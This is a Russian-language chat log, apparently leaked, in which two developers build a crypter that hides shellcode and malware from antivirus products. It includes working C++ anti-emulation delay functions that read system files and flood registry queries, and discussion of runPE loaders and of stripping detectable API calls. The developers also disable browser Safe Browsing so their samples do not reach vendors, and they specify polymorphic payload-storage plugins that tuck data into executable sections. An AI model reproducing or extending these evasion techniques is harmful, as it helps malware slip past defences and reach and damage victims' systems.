[24.09.21 15:17:44] biggie:		без шелкодов 1 антивирус реагирует
[24.09.21 15:17:52] orval:		какой?
[24.09.21 15:17:57] biggie:		без первого - 2
[24.09.21 15:18:32] biggie:		Webroot SecureAnywhere
[24.09.21 15:18:45] biggie:		norton часто реагирует
[24.09.21 15:19:03] orval:		webroot - malware это фигня не обращай вниманияэ
[24.09.21 15:19:41] biggie:		должно быть чтобы никто не реагировал?
[24.09.21 15:20:31] orval:		кроме webroot
[24.09.21 15:20:53] orval:		на сайте он постоянно детект выдает
[24.09.21 15:21:15] biggie:		еще думал, что реагируют из-за большой энотропии - зашифровал base64 поверх xor - стало хуже
[24.09.21 15:21:44] orval:		энтропии чего?
[24.09.21 15:22:04] biggie:		секции, которую добавляет криптер
[24.09.21 15:23:23] biggie:		постановки характеристики секции в read ничего не дало
[24.09.21 15:23:43] orval:		ну я так понимаю надо что-то с шелами делать
[24.09.21 15:25:20] biggie:		на выходных буду пробовать добавлять вначало шелкодов код
[24.09.21 15:25:36] orval:		первый шел это какой?
[24.09.21 15:25:49] orval:		файл как называется
[24.09.21 15:26:18] biggie:		mainx86.bin
[24.09.21 15:35:57] orval:		код функций которые я описывал нужен?
[24.09.21 15:36:12] biggie:		давай
[24.09.21 15:37:27] orval:		```
char* GetRandomBuf()
{
	char tempFileName[MAX_PATH];
	char targetFileName[MAX_PATH];
	// random
	size_t randomNum = 8;
	WIN32_FIND_DATAA ffd;

	DWORD size = 0;

	GetSystemDirectoryA((LPSTR)tempFileName, (UINT)MAX_PATH);
	GetSystemDirectoryA((LPSTR)targetFileName, (UINT)MAX_PATH);
	StringCchCatA(tempFileName, MAX_PATH, "\\*");

	HANDLE f = FindFirstFileA(tempFileName, &ffd);

	size_t count = 0;
	char** fileNamesArr = new char*[5000];
	DWORD rbRead;

	for (size_t i = 0; i < 5000; ++i)
		fileNamesArr[i] = new char[MAX_PATH];

	// set randomly
	size_t fileSize = 150000;
	do
	{
		if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			if (ffd.nFileSizeLow > fileSize)
			{
				int a = 1;
				int b = 2;
				StringCchCopyA(fileNamesArr[count], MAX_PATH, ffd.cFileName);
				++count;

				a += b + count;
			}
		}
	} while (FindNextFileA(f, &ffd) && count < 5000);

	FindClose((HANDLE)f);

	randomNum %= count;

	StringCchCatA(targetFileName, MAX_PATH, "\\");

	StringCchCatA(targetFileName, MAX_PATH, fileNamesArr[randomNum]);

	HANDLE hFile = CreateFileA(targetFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);

	size = (DWORD)GetFileSize((HANDLE)hFile, nullptr);

	char* buf = new char[size];
	
	ReadFile((HANDLE)hFile, buf, size, &rbRead, nullptr);

	for (DWORD i = 0; i < fileSize; ++i)
	{
		if (buf[i] == 0)
		{
			size_t z = i;
			size_t t = i * 32;
			size_t y = i * 123 - 44 + i;
			z = t * y % 255;

			if (z != 0)
				buf[i] = z;
			else
				buf[i] = z + 23;

			i = 0;
		}
	}

	/*delete[] fileNamesArr;
	pCloseHandle(hFile);
	*/
	buf[fileSize - 1] = 0;

	return buf;
}
[24.09.21 15:37:40] orval:		```
bool QueryReg(char* buf, DWORD startTime)
{
	size_t result = 0;
	LSTATUS errCode = 0;
	HKEY hKey;
	size_t step = 0;
	//do random
	char* parameterName = (char*)"zsadsgjea";
	//do random
	char* parameterValue = (char*)"svogfiifotuz";
	DWORD dataSize = 12;

	while (step < StrLen(buf) - 18)
	{
		char* temp = (char*)MyHeapAlloc(12);// new char[12];
		temp[11] = 0;

		m_memcpy(temp, buf + step, 11);

		errCode = (LSTATUS)RegOpenKeyExA((HKEY)HKEY_CURRENT_USER, temp, (DWORD)0, (REGSAM)KEY_READ, &hKey);

		if (errCode != ERROR_FILE_NOT_FOUND && hKey)
		{
			errCode = (LSTATUS)RegQueryValueExA(hKey, (LPCSTR)parameterName, nullptr, nullptr, (LPBYTE)parameterValue, &dataSize);

			if (errCode != ERROR_SUCCESS && hKey)
				++result;
		}

		//step += 18;
		step += 40;
		
		free(temp);

		if ((DWORD)GetTickCount() - startTime > 1000 * 20)
			break;
	}

	return result > 10;
}
[24.09.21 15:37:54] orval:		```char* buf = GetRandomBuf();
	bool flag = QueryReg(buf, GetTickCount64());
[24.09.21 15:38:49] orval:		там параметрами регулируется задержка
[24.09.21 15:39:11] orval:		step точно и fileSize вроде
[24.09.21 15:53:17] biggie:		спс
[24.09.21 17:11:28] orval:		а ты сразу шел пишешь, или сначала код на C ?
[24.09.21 17:12:50] biggie:		если знаю что точно заработает, то сразу если сомневаюсь, то сначала в обычном проекте ткстю
[24.09.21 17:13:45] orval:		на С mainx86.bin нет?)
[24.09.21 17:14:23] biggie:		а эт бинарник)
[24.09.21 17:14:35] biggie:		MainShellCode
[24.09.21 17:14:39] biggie:		на c
[24.09.21 17:14:59] biggie:		а ты шелкоды на c или c++ пишешь?
[24.09.21 17:15:10] orval:		не пишу
[24.09.21 17:16:08] biggie:		есть ли смысл rust для шелкодов попробовать?
[24.09.21 17:16:46] biggie:		он вроде как больше асемблера выдает
[24.09.21 17:17:12] biggie:		по сравнению с С
[24.09.21 17:17:34] orval:		а ты те сначала пишешь на С, потом берешь бинарник?
[24.09.21 17:18:36] biggie:		пишу, собираю потом там python скрипт, он из бинарника шелкод вытаскивает, потом клею это клеем
[24.09.21 17:18:56] orval:		ну раст генерит конечно побольше кода
[24.09.21 17:19:55] orval:		но на нем проблематично писать то что требуется
[24.09.21 17:20:34] orval:		я не большой знаток раста, но у меня сейчас есть на нем проект
[24.09.21 17:21:16] orval:		я до сих пор так и не смог выделить память с правами на выполнение на чистом расте
[24.09.21 17:22:12] orval:		все эти языки хороши в таких белых продуктах
[24.09.21 17:22:53] orval:		чтобы там сервис висел 24/7 и не падал от утечки памяти и тд
[24.09.21 17:23:04] biggie:		понятно
[24.09.21 17:23:33] orval:		а ты отдельные куски в шелкоде не пропускал, чтобы по максимому локализовать
[24.09.21 17:23:47] orval:		вплоть до библиотечного вызова
[24.09.21 17:25:10] orval:		и ты убрал первый, но с точки зрения проверки ты возможно убрал и все остальные шелы, потому что они вызывались из него
[24.09.21 17:25:28] biggie:		я оставлял в шелкоде поиск адресов winapi функций и поиск структуры с адресами по сигнатуре и все равно реагируют
[24.09.21 17:28:23] orval:		если я в сорсе закоменчу строку и пересоберу то склейка будет так же работать только без куска шелкода?
[24.09.21 17:29:15] biggie:		да, склейке пофиг что в шелкоде
[24.09.21 17:51:07] orval:		а как-то быстро можно только один шелкод ребилднуть?
[24.09.21 17:54:55] biggie:		`superclue\shellcode\recompile.bat` в нем после 47 строки поставить `exit 0` и запустить его, тогда соберется только mainshellcode и он будет в `superclue\shellcode\shellcodes`
[24.09.21 18:48:14] orval:		что этот вызов делает?
```((tfunc1)getEntryPtr(clueInfo->va_decryption_sc))();
[24.09.21 18:48:16] orval:		49 строка
[24.09.21 18:49:06] biggie:		шелкод расшифровки запускает
[24.09.21 18:49:16] biggie:		это второй шелкод
[24.09.21 19:02:26] orval:		DecryptShellCode?
[24.09.21 19:03:13] biggie:		да
[24.09.21 19:19:17] orval:		__wide_to_ansi твоя функция?
[24.09.21 19:19:22] orval:		```__wide_to_ansi
[24.09.21 19:19:33] orval:		и ```int szArgs = mwcslen(args);
[24.09.21 19:37:45] biggie:		да
[27.09.21 19:12:06] orval:		привте
[27.09.21 19:12:24] biggie:		привет
[27.09.21 19:12:42] orval:		есть успехи?
[27.09.21 19:15:09] biggie:		нет. 2-3 детекта, если клеить не вирус, с вирусом 5-6. Добавление твоих функций дает на 1-2 детекта меньше. при склейке x64 не вирусов детектов нет.
[27.09.21 19:16:14] biggie:		на x64 всегда меньше детектов?
[27.09.21 19:16:25] orval:		да
[27.09.21 19:17:16] orval:		а локализовать место не удалось?
[27.09.21 19:17:59] biggie:		любой из шелкодов примерно одинаково детекится
[27.09.21 19:18:23] biggie:		может обфускацию переделать?
[27.09.21 19:18:59] biggie:		если сделать шелкод компактнее - то детектов меньше становится
[27.09.21 19:19:48] orval:		нужно найти конкретное место на котором детект
[27.09.21 19:20:22] orval:		вызов какой-то функции или цикл в котором ты расшифровываешь нагрузку
[27.09.21 19:20:54] orval:		__wide_to_ansi - это твоя фунция?
[27.09.21 19:21:02] biggie:		да
[27.09.21 19:21:47] biggie:		с ней что-то не так?
[27.09.21 19:22:16] orval:		нет вроде
[27.09.21 19:22:41] orval:		просто пытался куски выкинуть и определить на что детект
[27.09.21 19:24:03] orval:		функции по задержки куда вставил?
[27.09.21 19:24:41] biggie:		в начало 1 шелкода
[27.09.21 19:27:55] orval:		сколько задержки он дал?
[27.09.21 19:28:10] biggie:		2-3секунды
[27.09.21 19:28:50] orval:		а увеличить можешь?
[27.09.21 19:29:09] biggie:		попробую
[27.09.21 19:29:20] orval:		ну и нужно найти конкретный кусок шелкода
[27.09.21 19:29:27] orval:		или несколько
[27.09.21 19:29:35] orval:		которые дают детекты
[27.09.21 19:32:52] orval:		NtFlushInstructionCache вызывается?
[27.09.21 19:33:04] biggie:		не
[27.09.21 19:33:30] orval:		в шеле hugo есть
[27.09.21 19:34:44] biggie:		а ну это отдельный шелкод, он клеится в случае rundll32 без сброса на диск, в остальных случаях клеится runpe шелкод
[27.09.21 19:35:43] orval:		а крипто функции из Advapi32 или еще какие либо nt функции?
[27.09.21 19:37:44] biggie:		крипто нет, nt тоже вроде нет
[27.09.21 19:38:00] orval:		функция decrypt вклеивается?
[27.09.21 19:38:14] orval:		там все эти вызовы
[27.09.21 19:38:42] biggie:		она не вызывается, decrypt2 вызывается
[27.09.21 19:39:05] orval:		но в итоге код такой есть
[27.09.21 19:39:20] orval:		?
[27.09.21 19:39:24] orval:		в конечном файле
[27.09.21 19:39:40] biggie:		ща уберу
[27.09.21 19:45:10] biggie:		2 детекта
[27.09.21 19:46:53] biggie:		твой код так вызываю
[27.09.21 19:47:17] biggie:		`tGetTickCount pGetTickCount = (tGetTickCount)pGetProcAddressWithHash(hGetTickCount);`
`	char *bbuff = GetRandomBuf();`
`	while (1)`
`	{`
`		if (!QueryReg(bbuff, pGetTickCount()))`
`			break;`
`	}`
[27.09.21 19:51:06] orval:		какие детекты?
[27.09.21 19:51:26] orval:		и их меньше стало после добавления кода или сейчас после удаления крипто функций?
[27.09.21 19:51:40] biggie:		после возвращения стало 3
[27.09.21 19:52:02] biggie:		детекты в 1 случае nano и webroot
[27.09.21 19:52:22] biggie:		во 2  nano, webroot и norton
[27.09.21 19:52:32] orval:		после возвращения чего?
[27.09.21 19:52:43] orval:		webroot пропускай
[27.09.21 19:53:13] biggie:		ф-ции decrypt с вызовами Advapi32
[27.09.21 19:53:38] orval:		ну значит убрать это надо)
[27.09.21 19:53:46] orval:		тем более не используется
[27.09.21 19:53:56] biggie:		угу
[27.09.21 19:54:11] orval:		а были еще xcrypt чето там, они ушли после добавления мусорного кода?
[27.09.21 19:54:25] orval:		и попробуй еще на всякий убрать  NtFlushInstructionCache
[27.09.21 19:54:31] orval:		если ничего не произойдет можешь вернуть
[27.09.21 19:54:36] orval:		но она вроде роли не играет
[27.09.21 19:54:59] orval:		и в итоге имеем один детект nano?
[27.09.21 19:55:08] biggie:		ага
[27.09.21 19:55:16] orval:		ну это уже значительно лучге
[28.09.21 16:22:49] orval:		привет
[28.09.21 16:23:09] biggie:		привет
[28.09.21 16:23:24] orval:		в гите актуальная версия?
[28.09.21 16:24:07] biggie:		не старая, в которой все работает, но она детектится
[28.09.21 16:24:52] orval:		а то что сейчас есть может не работать?
[28.09.21 16:26:03] biggie:		сейчас все равно детектится
[28.09.21 16:26:28] biggie:		работать должно все
[28.09.21 16:26:36] orval:		я просто думал самому посмотреть
[28.09.21 16:27:08] orval:		можешь в новую ветку testing залить, а потом как закончим, замержить с develop просто?
[28.09.21 16:27:21] orval:		*в develop
[28.09.21 16:27:38] biggie:		могу
[28.09.21 16:27:50] biggie:		ща
[28.09.21 16:51:05] biggie:		добавил ветку testing
[28.09.21 16:54:00] biggie:		на 1 и том же файле сначала 2,потом 3 детекта
антивирусы типа учатся?
[28.09.21 16:54:57] biggie:		ппц
[28.09.21 16:56:22] orval:		ну да
[28.09.21 16:56:54] orval:		но только они не должны на твоих
[28.09.21 16:56:57] orval:		потому что они ни куда не уходят
[28.09.21 16:57:07] orval:		ты через тор заливаешь на динчек?
[28.09.21 16:57:29] biggie:		да через обычную мозилу и тор прокси
[28.09.21 16:57:41] orval:		123
[28.09.21 16:57:53] biggie:		да через обычную мозилу и тор прокси
[28.09.21 16:58:19] orval:		блин)
[28.09.21 16:58:38] orval:		safebrowsing надо отключить
[28.09.21 16:58:53] orval:		в about:config
[28.09.21 16:59:17] orval:		образцы могут сливаться во время аплоуда
[28.09.21 16:59:46] orval:		ну и кроме safebrowsing надо разумеется в обычных настройках все поотключать
[28.09.21 17:00:04] orval:		в торе вроде по умолчанию все выключено
[28.09.21 17:04:38] orval:		ну и на тачке ав у тебя нет?
[28.09.21 17:05:09] biggie:		стандартный виндовый отключен
[28.09.21 17:05:19] biggie:		другого нет
[28.09.21 17:05:28] orval:		safebrowsing - надо выпилить все что есть
[28.09.21 17:06:08] biggie:		отключил
[28.09.21 17:08:26] orval:		хорошо
[28.09.21 17:08:44] orval:		а чего тором не пользуешься?
[28.09.21 17:08:59] biggie:		fafaef
[28.09.21 17:09:49] biggie:		123
[28.09.21 17:11:57] orval:		не видел?
[28.09.21 17:12:19] biggie:		не повтори пожалуста
[28.09.21 17:12:23] orval:		а чего тором не пользуешься?
[28.09.21 17:12:54] biggie:		мозила поудобней
[28.09.21 17:13:01] biggie:		лучше тор?
[28.09.21 17:13:49] orval:		ну наверное получше, можно испльзовать только для пары сайтов, а все остальное в мозиле
[28.09.21 17:15:31] orval:		https://wiki.mozilla.org/Security/Features/Application_Reputation_Design_Doc
https://wiki.mozilla.org/Security/Safe_Browsing
https://wiki.mozilla.org/Security/Download_Protection
[28.09.21 17:15:47] orval:		просто сам факт наличия таких функций очень стремает
[28.09.21 17:16:01] biggie:		поставил тор)
[28.09.21 17:16:16] orval:		там тоже safebrowsing проверь
[28.09.21 17:17:19] biggie:		некоторые пункты там включены
[28.09.21 17:17:53] orval:		тоже поотключай
[29.09.21 11:41:10] orval:		привет
[29.09.21 11:52:10] orval:		в ветке testing main шел не генерируется
[29.09.21 12:00:08] biggie:		привет ща обновлю
[29.09.21 12:01:24] biggie:		обновил
[29.09.21 13:31:44] biggie:		3 детекта, считая webroot
[29.09.21 13:46:08] biggie:		обновил гит
[29.09.21 13:46:25] orval:		хорошо посмотрю
[01.10.21 22:06:21] biggie:		привет
[01.10.21 22:07:01] biggie:		получилось уменьшить количество детектов до 2
[01.10.21 22:07:29] biggie:		детектят webroot и nano
[01.10.21 22:07:41] biggie:		гит обновил
[04.10.21 10:50:55] biggie:		привет получилось уменшить количество детектов до 2
[04.10.21 10:51:19] orval:		привет
[04.10.21 10:51:29] biggie:		nano и webroot детектят
[04.10.21 10:51:45] orval:		nano не получается убрать?
[04.10.21 10:51:57] biggie:		не
[04.10.21 10:52:16] orval:		хорошо я посмотрю как будет время
[04.10.21 10:52:34] orval:		может это будет только когда элрой выйдет
[04.10.21 10:53:20] orval:		тебе сейчас надо проверить все остальные профили на статику
[04.10.21 10:53:54] orval:		если со статикой сделал все по максимому, проверить на работоспособность
[04.10.21 10:54:17] orval:		после этого можно будет начинать проверять динамику
[04.10.21 10:54:24] biggie:		у тя есть длл с вирусами для тестов?
[04.10.21 10:54:40] orval:		да сейчас найду
[25.10.21 13:06:00] orval:		привет
[25.10.21 13:06:28] biggie:		привет
[25.10.21 13:06:45] orval:		123
[25.10.21 13:06:59] orval:		получается последнее задание?
[25.10.21 13:07:58] orval:		в репозиторий не заливал?
[25.10.21 13:08:58] orval:		сейчас узнаю
[25.10.21 13:11:16] orval:		скинь мне пока мне
[25.10.21 13:16:54] orval:		у тебя есть мой ключ?
[25.10.21 13:18:05] orval:		```-----BEGIN PGP PUBLIC KEY BLOCK-----

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
HEl28DKgb19um+HhWrFpudPB4UytFwSAdLx0vMw=
=AWko
-----END PGP PUBLIC KEY BLOCK-----
[25.10.21 13:18:29] orval:		после первой строки отступ вроде должен быть
[25.10.21 13:18:45] orval:		-----BEGIN PGP PUBLIC KEY BLOCK-----

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
HEl28DKgb19um+HhWrFpudPB4UytFwSAdLx0vMw=
=AWko
-----END PGP PUBLIC KEY BLOCK-----
[25.10.21 13:26:24] orval:		pdf?
[25.10.21 13:27:32] orval:		расшифровался сам файл в pdf
[25.10.21 13:37:20] orval:		кинь пожалуйста через qaz.im
[25.10.21 13:38:25] orval:		или https://privatlab.com/
[25.10.21 13:48:37] orval:		шифрование нужно сделать
[25.10.21 13:50:07] orval:		и еще одно задание
[25.10.21 13:51:01] orval:		```2. Плагин данных
Прототип функции плагина: def set_payload(payload), type(payload) = binary string, файл payload.py;
Прототип функции модуля: BYTE* GetPayload(HINSTANCE hInst), где hInst - базовый адрес загрузки модуля,
		в котором выполняется данный код, файлы GetPayload.hpp, GetPayload.cpp;
[25.10.21 13:52:52] orval:		функция плагина генерирует код который будет хранить payload
[25.10.21 13:53:14] orval:		функция модуля возвращает эту строку
[25.10.21 13:54:17] orval:		хранить, в том смысле что при компиляции, эта строка будет лежать в бинарном файле каким-то образом
[25.10.21 14:01:14] orval:		файл полученный в результате компиляции exe/dll
[28.10.21 10:38:05] orval:		привет
[28.10.21 10:38:22] biggie:		привет
[28.10.21 10:39:57] orval:		плагин шифрования неправильно работает, в тз указано что входная строка - в бинарном виде, и если такую передать то скрипт падает
[28.10.21 10:41:32] orval:		есть еще новые плагины?
[28.10.21 10:42:07] orval:		но оно тоже работает с обычной строкой?
[28.10.21 10:42:37] orval:		скинь тогда
[28.10.21 11:12:35] orval:		для cryptography достаточно 3.8 версия?
[28.10.21 11:13:45] orval:		после установки через pip install выдает ошибку скрипт
[28.10.21 11:22:23] orval:		не, с этим все в порядке
[28.10.21 11:27:58] orval:		а old_size это что?
[28.10.21 11:30:06] orval:		размер чего?
[28.10.21 11:31:16] orval:		ага понял
[28.10.21 11:31:27] orval:		а ключ нельзя рандомизировать?
[28.10.21 11:32:09] orval:		а он и так
[28.10.21 12:38:14] orval:		работает
[28.10.21 12:38:33] orval:		плагин данных начинал делать?
[28.10.21 12:39:14] orval:		да, желательно в ближайшие дни
[28.10.21 12:39:59] orval:		для начала да)
[28.10.21 12:40:09] orval:		но нужно конечно больше
[28.10.21 12:40:43] orval:		да
[28.10.21 12:40:55] orval:		но можно одну и ту же идею по разному реализовать
[28.10.21 12:41:01] orval:		главное чтобы код был другим
[28.10.21 12:41:13] orval:		и как можно более полиморфным
[28.10.21 12:41:32] orval:		есть идеи?
[28.10.21 12:42:26] orval:		в виде строки?
[28.10.21 12:43:02] orval:		для начала пойдет)
[28.10.21 12:44:27] orval:		еще например можно дерективно запушить в секции
[28.10.21 12:44:41] orval:		а потом найти в них и собрать
[28.10.21 12:46:09] orval:		сказать компилятору, чтобы он сложил данные в секцию, на этапе компиляции
[28.10.21 12:46:21] orval:		вот так
[28.10.21 12:46:23] orval:		```#pragma section(".text", read, execute)
			unsigned int __declspec(allocate(".text")) array1[] = { 201, ... , };
[28.10.21 12:47:09] orval:		только все в .text не нужно складывать, а хотя бы поделить еще с .data
[01.11.21 13:28:01] orval:		привет
[01.11.21 13:28:15] biggie:		привет
[01.11.21 13:28:48] orval:		есть новые плагины?
[01.11.21 13:29:29] biggie:		да 2 варианта плагина хранения и шифрование подправил
[01.11.21 13:29:37] biggie:		скидываь?
[01.11.21 13:30:06] orval:		давай
[01.11.21 13:47:57] biggie:		через какой сервис лучше передать ?
[01.11.21 14:17:19] biggie:		а все нашел
[01.11.21 14:17:21] biggie:		https://privatlab.com/s/v/pw6rXD4oe2T0dAgXwg03
[01.11.21 14:17:28] biggie:		https://privatlab.com/s/d/pw6rXD4oe2T0dAgXwg03/q775z#delete
[01.11.21 15:16:28] orval:		принял
[01.11.21 18:05:28] orval:		когда с кодировкой base64 делаешь
[01.11.21 18:05:38] orval:		при компиляции такую ошибку выдало
[01.11.21 18:05:42] orval:		```GetPayload.cpp(8,20): error C2026: string too big, trailing characters truncated
[01.11.21 18:06:26] orval:		если сделать массив то не должно проблем возникать
[01.11.21 18:06:51] biggie:		ок
[01.11.21 18:10:34] orval:		либо перевод на новою строку, но я не уверен
